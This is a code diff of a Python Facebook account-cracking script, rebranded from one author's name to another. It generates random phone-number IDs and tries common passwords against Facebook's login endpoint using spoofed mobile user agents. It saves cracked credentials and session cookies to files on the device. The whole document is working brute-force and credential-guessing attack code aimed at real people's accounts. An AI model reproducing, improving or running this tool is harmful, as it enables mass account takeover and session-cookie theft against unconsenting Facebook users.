@@ -123,7 +123,7 @@ bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "0
 done = False
 
 ugen=[]
-for x in range(100):
+for x in range(5000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['6','7','8','9','10','11','12'])
     c=' en-us; GT-'
@@ -150,39 +150,35 @@ def back():
 	login()
 	
 	
-def SOHAN_S_K1N9():
+def RJ_S_K1N9():
     os.system('clear')
     print(logo)
     print("")
-    print('\033[32;1m[01] RANDOM CLONING ')
+    print('\033[32;1m[01] RANDOM CLONING ')    
     print('\x1b[1;94m════════════════════════════════════════\x1b[1;92')
-    SOHAN = input('\n\x1b[1;32mCHOOSE : ')
-    if SOHAN == '1':
+    RJ = input('\n\x1b[1;32mCHOOSE : ')
+    if RJ == '1':
     	os.system('speak -a 300 "random cloning start"')
     os.system('xdg-open https://www.facebook.com/Mr.ErrorBd0.9')
     time.sleep(5)
-    SOHAN_SN()
-    if SOHAN == '0': 
+    RJ_SN()
+    if RJ == '0': 
         os.system('exit')
         return None
 
-logo = ("""\033[1;32m          
-	    _____ ____  __  _____    _   __
-	  / ___// __ \/ / / /   |  / | / /
-	  \__ \/ / / / /_/ / /| | /  |/ / 
-	 ___/ / /_/ / __  / ___ |/ /|  /  
-	/____/\____/_/ /_/_/  |_/_/ |_/   
-                                  
- \033[0;92m┌───────────────────────────────────────┐
- \033[0;92m│ [•] AUTHOR : SOHAN KHAN           
- \033[0;92m│ [•] GITHUB :  SOHAN143S               
- \033[0;92m│ [•] STATUS : PERSONAL         
- \033[0;92m│ [•] TOOLS :\033[1;32m RANDOM\033[0;92m 
- \033[0;92m└───────────────────────────────────────┘
-  \x1b[0;91m\x1b[1;43mᏆͲՏ ՏϴᎻᎪΝ ͲᎻᎬ ՏᏆᏞᎬΝͲ ᏦᏆᏞᏞᎬᎡ\x1b[0m
- \x1b[1;94m════════════════════════════════════════\x1b[1;92""")
+logo = (f"""
+\033[1;33m ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+\033[0;92m┌──────────────────────────────────────┐
+\033[0;92m│ [•] AUTHOR : RJ SHANTO           
+\033[0;92m│ [•] GITHUB : NOT FOUNT               
+\033[0;92m│ [•] STATUS : PERSONAL         
+\033[0;92m│ [•] TOOLS  : RANDOM
+\033[0;92m└──────────────────────────────────────┘
+\x1b[1;94m════════════════════════════════════════\x1b[1;92""")
 def linex():
-	print('\x1b[1;94m════════════════════════════════════════\x1b[1;92')
+	print('\x1b[1;94m═══════════════════════════════════════\x1b[1;92')
 
 
 
@@ -202,7 +198,7 @@ def dynamic(text):
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
 # APK CHECK
-def SOHAN_SN():
+def RJ_SN():
     user=[]
     twf =[]
     os.getuid
@@ -216,7 +212,7 @@ def SOHAN_SN():
     print("")
     os.system('clear')
     print(logo)
-    limit = int(input('\033[1;93m EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92m   CHOOSE CLONING LIMIT : '))
+    limit = int(input('\033[1;93m EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92mCHOOSE CLONING LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -224,18 +220,18 @@ def SOHAN_SN():
         os.system("clear")
         print(logo)
         tl = str(len(user))
-        print('\033[1;92m SIM CODE : \033[1;92m' +code)
+        print('\033[1;92mSIM CODE : \033[1;92m' +code)
         linex()
         print('\033[1;92mTOTAL IDS : \033[1;92m'+tl)
         linex()
-        print('\033[1;92m IF ID NOT COME TURN ON AIRPLNE')
+        print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'rahman','mimmim','lamiya','jahangir','sabbir','jannatul','aklima','soniya','১২৩৪৫৬']
+            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','i love you','bangladesh','bangla']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
-    print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;92mIDS SAVED IN SOHAN.txt')
+    print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;92mIDS SAVED IN RJ.txt')
  
 def rcrack(uid,pwx,tl):
     #print(user)
@@ -259,7 +255,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'web.facebook.com',
+            header_freefb = {"authority": 'free.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
@@ -279,7 +275,7 @@ def rcrack(uid,pwx,tl):
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
-            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -288,25 +284,25 @@ def rcrack(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f"\r\033[38;5;46m[SOHAN-OK 💚] {uid}|{ps}")
+                    print(f"\r\033[38;5;46m[RJ-OK 💚] {uid}|{ps}")
                     print(f'  \r\033[1;92m   [COOKIE🍪] '+coki)
-                    open('/sdcard/SOHAN RAN.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
+                    open('/sdcard/RJ RAN.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SOHAN-CP❌] {uid}|{ps}")
-                open('/sdcard/SOHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[RJ-CP❌] {uid}|{ps}")
+                open('/sdcard/RJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[SOHAN💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[RJ💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
   
         
-SOHAN_S_K1N9()
+RJ_S_K1N9()
